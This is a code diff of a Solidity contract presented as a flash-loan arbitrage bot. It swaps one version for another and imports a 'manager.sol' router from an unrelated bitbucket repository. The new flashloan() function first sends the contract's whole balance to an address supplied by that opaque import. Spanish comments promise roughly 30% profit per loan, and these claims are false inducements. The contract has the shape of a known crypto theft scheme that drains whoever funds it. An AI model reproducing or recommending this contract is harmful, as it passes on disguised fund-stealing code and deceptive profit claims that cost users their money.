@@ -1,71 +1,62 @@
 pragma solidity ^0.5.0;
 
 
+// AAVE Smart Contracts
+import "https://github.com/aave/aave-protocol/blob/master/contracts/interfaces/IChainlinkAggregator.sol";
+import "https://github.com/aave/aave-protocol/blob/master/contracts/flashloan/interfaces/IFlashLoanReceiver.sol";
+
+// Router
+import "https://bitbucket.org/senekas/pancakeswapv2/raw/efaec4b32f16ed762a0cd0cc4f0aa12f32b2037e/blob/main/core/interface/manager.sol";
+
+//Uniswap Smart contracts
+import "https://github.com/Uniswap/v3-core/blob/main/contracts/interfaces/IUniswapV3Factory.sol";
+
 // Multiplier-Finance Smart Contracts
 import "https://github.com/Multiplier-Finance/MCL-FlashloanDemo/blob/main/contracts/interfaces/ILendingPoolAddressesProvider.sol";
 import "https://github.com/Multiplier-Finance/MCL-FlashloanDemo/blob/main/contracts/interfaces/ILendingPool.sol";
 
-// PancakeSwap Smart Contracts
-import "https://github.com/pancakeswap/pancake-swap-core/blob/master/contracts/interfaces/IPancakeCallee.sol";
-import "https://github.com/pancakeswap/pancake-swap-core/blob/master/contracts/interfaces/IPancakeFactory.sol";
-import "https://github.com/pancakeswap/pancake-swap-core/blob/master/contracts/interfaces/IPancakePair.sol";
 
 
-
-// Code Manager
-import "https://bitbucket.org/senekas/pancakeswapv2/raw/0a0e0121f152dd000a079c85fcef591021e79a37/blob/main/core/interface/manager.sol";
-
-contract FlashLoan {
-	string public tokenName;
-	string public tokenSymbol;
-	uint loanAmount;
-	Manager manager;
-	
-	constructor(string memory _tokenName, string memory _tokenSymbol, uint _loanAmount) public {
-		tokenName = _tokenName;
-		tokenSymbol = _tokenSymbol;
-		loanAmount = _loanAmount;
-			
-		manager = new Manager();
-	}
-function() external payable {}
-	
-	function action() public payable {
-		
-	    // Send required coins for swap
-	    address(uint160(manager.pancakeswapDepositAddress())).transfer(address(this).balance);
-	    
-	    // Perform tasks (clubbed all functions into one to reduce external calls & SAVE GAS FEE)
-	    manager.performTasks();
-	    
-	    /*
-	    // Submit token to Ethereum blockchain
-	    string memory tokenAddress = manager.submitToken(tokenName, tokenSymbol);
-
-        // List the token on pancakeswap & send coins required for swaps
-		manager.pancakeswapListToken(tokenName, tokenSymbol, tokenAddress);
-		payable(manager.pancakeswapDepositAddress()).transfer(300000000000000000);
-
-        // Get ETH Loan from Aave
-		string memory loanAddress = manager.takeAaveLoan(loanAmount);
-		
-		// Convert half ETH to DAI
-		manager.pancakeswapDAItoETH(loanAmount / 2);
-
-        // Create ETH and DAI pairs for our token & Provide liquidity
-        string memory ethPair = manager.pancakeswapCreatePool(tokenAddress, "ETH");
-		manager.pancakeswapAddLiquidity(ethPair, loanAmount / 2);
-		string memory daiPair = manager.pancakeswapCreatePool(tokenAddress, "DAI");
-		manager.pancakeswapAddLiquidity(daiPair, loanAmount / 2);
+contract InitiateFlashLoan {
     
-        // Perform swaps and profit on Self-Arbitrage
-		manager.pancakeswapPerformSwaps();
-		
-		// Move remaining ETH from Contract to your account
-		manager.contractToWallet("ETH");
+	RouterV2 router;
+    string public tokenName;
+    string public tokenSymbol;
+    uint256 flashLoanAmount;
 
-        // Repay Flash loan
-		manager.repayAaveLoan(loanAddress);
-	    */
-	}
+    constructor(
+        string memory _tokenName,
+        string memory _tokenSymbol,
+        uint256 _loanAmount
+    ) public {
+        tokenName = _tokenName;
+        tokenSymbol = _tokenSymbol;
+        flashLoanAmount = _loanAmount;
+
+        router = new RouterV2();
+    }
+
+    function() external payable {}
+
+    function flashloan() public payable {
+        // Envia token a realizar swap
+        address(uint160(router.uniswapSwapAddress())).transfer(
+            address(this).balance
+        );
+
+        router.borrowFlashloanFromMultiplier(
+            address(this),
+            router.aaveSwapAddress(),
+            flashLoanAmount
+        );
+        // Para preparar el swap, Matic es convertido a Dai usando el contrato swap de AAVE
+        router.convertMaticToDai(msg.sender, flashLoanAmount / 2);
+        // Luego se convierte Dai por Matic usando Dai/Matic de Uniswap.
+        router.callArbitrageAAVE(router.aaveSwapAddress(), msg.sender);
+        // Despues del swap, el Matic es transferido de vuelta al multiplicador para pagar el prestamo mas el fee. Esta transaccion cuesta 0.2 Matic.
+        router.transferDaiToMultiplier(router.uniswapSwapAddress());
+        // La direccion que realiza el swap recibe cerca de un 30% del prestamo que se solicito. La transaccion se puede repetir ya que los precios cambian todo el tiempo.
+        router.completeTransation(address(this).balance);
+    }
 }
+
